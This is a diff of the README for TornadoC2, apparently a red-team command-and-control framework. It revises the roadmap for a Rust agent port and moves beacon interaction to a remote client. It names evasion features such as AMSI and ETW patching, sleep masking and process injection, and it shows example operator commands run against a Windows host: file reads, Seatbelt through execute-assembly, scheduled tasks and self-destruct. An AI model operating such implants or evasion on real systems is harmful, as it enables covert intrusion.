@@ -196,85 +196,17 @@ The rest of this document describes how it works. This section describes why it 
 
 ### What comes next
 
-**The Go agent is frozen; the next agent is Rust.**
+- **macOS support.** Cross-compiles today; the platform-specific
+  native verbs and the sleep-mask implementation are what remains.
 
-Development on the Go agent has stopped. No new transports, no
-new native verbs, no new evasion primitives, no structural
-changes. The Go agent in this tree is the Go agent this tree
-will have. It still works — every capability documented above is
-live, it is not deprecated, and it is not scheduled for removal.
-But no new Go build will carry a new feature.
+- **More native commands.** Depth on the execution and operational
+  sides. Same principle as the current set: in-process, standard library, no
+  child process.
 
-**The reason is size.** A default Go beacon is 8–20 MiB
-depending on the OPSEC profile and whether the injection pass is
-embedded. That is the Go runtime, its GC, its reflection
-metadata, and its standard-library link footprint compiled into
-every binary — not the C2 logic, not the crypto, not the
-transports. `-ldflags="-s -w"`, `garble`, and UPX shave at the
-edges; they do not change the shape.
-
-**The replacement is a Rust agent.** Stripped, LTO'd,
-`panic=abort`, no runtime, no GC, no reflection metadata — the
-same protocol, crypto, and native verb surface in the low
-single-digit megabytes, with room for every capability the Go
-agent carries. Rust also offers no GC pauses or goroutine stacks
-for a scanner to walk, full ClientHello control via `boring`
-(BoringSSL) instead of uTLS's reimplementation, a smaller
-syscall surface, and a custom allocator so the heap pattern is
-not a language fingerprint.
-
-The rewrite is a ground-up port, not a wrapper: no FFI to Go, no
-cgo, no embedded Go runtime. Same wire protocol, same
-compile-time configuration model, same ECDSA identity and task
-signing, same transports. A mixed fleet needs no second server,
-no second profile directory, no second workflow — the server
-cannot tell a Go agent from a Rust one.
-
-**What this means for an operator today:**
-
-- **Nothing has changed on the Go agent.** It runs, checks in,
-  and executes every verb the README documents.
-- **Critical bugs will be triaged.** A wire-protocol bug that
-  affects deployed sessions is a server-side bug too and is
-  fixed. A Go-specific bug — a race, a Windows path, a verb that
-  crashes on an edge case — is catalogued, and where the fix is
-  mechanical and low-risk, applied; where the fix is structural,
-  it waits for the Rust port, where the code will not exist.
-- **Transports the Rust agent does not yet carry keep working on
-  Go agents.** A mixed fleet is the expected shape during the
-  transition.
-- **macOS support moves to the Rust rewrite.** The Go build
-  cross-compiles and runs on macOS, but the platform-specific
-  native verbs and the sleep-mask implementation were never
-  implemented and will not be; that is the state the frozen tree
-  leaves them in.
-- **More native verbs move to Rust.** The next native verb this
-  framework ships will ship in the Rust agent.
-
-**The team server side is unchanged.** The handler, the C2
-profile system, the multi-profile routing, the pivot
-infrastructure, the audit chain, the credential vault, the loot
-store, the team chat, the webhook dispatcher, the dead-man's
-switch, the operator console, the GUI, the remote build pipeline,
-the scheduler, and the wire protocol all continue to receive
-changes. The rewrite is an agent-side project; the server is not
-part of it.
-
-**Aim: feature parity.** The goal is to carry every capability
-the Go agent has today into the Rust agent — the same transports,
-the same native verb set, the same evasion primitives, the same
-in-memory execution paths, the same pivot model. Some things may
-land after the first Rust release rather than with it; the ones
-that do will be named, not dropped silently.
-
-**The timeline is not a promise.** A Rust rewrite of an agent
-this size is months of work, and the longest parts — the Windows
-injection backends, the .NET worker, the AMSI and ETW patches,
-the sleep-mask implementation, the COFF loader, the
-uTLS-equivalent ClientHello work — are also the parts where Rust
-offers the largest long-term gain and imposes the largest
-short-term cost. The honest answer is: no exact date, working on
-it now, will ship as soon as it is ready.
+> **Status: the agent is Go.** A Rust port was started and archived on
+> the `rust-agent-development-phase` branch. It is not the shipped agent and there is
+> no exact time to complete it and ship as full agent. Agent-side contributions target 
+> `agent/` as Go source.
 
 ---
 
@@ -3532,17 +3464,29 @@ For a relayed child (SMB or TCP bind), two lines print in sequence:
 
 ### 4. Operate
 
+Copy `alice.cfg` to the operator's machine out of band and launch the
+remote client:
+
+```bash
+python beacon-client.py -c alice.cfg
 ```
-beacon> beacons                        # List active beacons
-beacon> beacon 1001                    # Attach to a beacon console
+
+The local console remains the server-side interface — it lists
+beacons, compiles agents, manages operators, and drives the dead-man's
+switch, but it does not attach to beacons. All interactive work on a
+target runs from the remote client:
+
+```
+adc > beacons                          # List active beacons
+adc > use 1001                         # Attach to a beacon
 ● beacon#1001 > ls C:\Users\alice
 ● beacon#1001 > cat C:\Users\alice\notes.txt
 ● beacon#1001 > exec whoami /all
 ● beacon#1001 > execute-assembly C:\tools\Seatbelt.exe -- -group=all
 ● beacon#1001 > sleep 120 0.4          # Change check-in interval
 ● beacon#1001 > schedule add 5m ps     # Recurring task
-● beacon#1001 > exit                    # Detach (beacon keeps running)
-● beacon#1001 > kill                    # Self-destruct (unlinks binary)
+● beacon#1001 > detach                  # Detach (beacon keeps running)
+adc > killall --ids 1001               # Queue self-destruct
 ```
 
 ---
@@ -4763,10 +4707,14 @@ server cleaned up the staged build
 
 ### Local console — main menu
 
+The local console manages the server: it lists beacons, compiles
+agents, manages operators, and drives the dead-man's switch. It does
+not attach to beacons — interactive work on a beacon runs from the
+remote client (see the next section).
+
 | Command | Description |
 |---------|-------------|
 | `beacons` / `bl` | List active beacons |
-| `beacon <ID>` | Attach to a beacon's interactive console |
 | `beacon-build [<os> <arch> [flags]]` | Compile an agent (wizard if no arguments) |
 | `beacon-build -c <file>` | Compile from a JSON build config |
 | `beacon-rm <ID>` / `beacon-forget <ID>` | Forget a session |
@@ -4864,7 +4812,10 @@ Every operation is audited with a role-aware vocabulary. The `detail`
 field on an export entry carries the SHA-256 of the config so a leak
 traces back to a specific export.
 
-### Beacon console (`beacon <ID>`)
+### Beacon console (remote client)
+
+Reached from the remote client with `use <id>`. Every verb dispatches
+against the currently used beacon.
 
 **Native in-process verbs:**
 
@@ -6231,6 +6182,7 @@ Both the parent and the child should be built with the same --c2-profile. The pa
 
 ---
 
+
 ## Profile Validation (`shapecheck`)
 
 `tornadoc2/shapecheck.py` validates a C2 profile before deployment.
@@ -7070,8 +7022,8 @@ and later reconnects keeps its alias and tags.
 ✓ #1001 tags: domain-controller
 ```
 
-The alias appears in the `beacons` table and in the attached-console
-prompt:
+The alias appears in the `beacons` table and in the remote client's
+prompt after `use`:
 
 ```
 ● beacon#1001(dc01) > ls C:\Users\alice
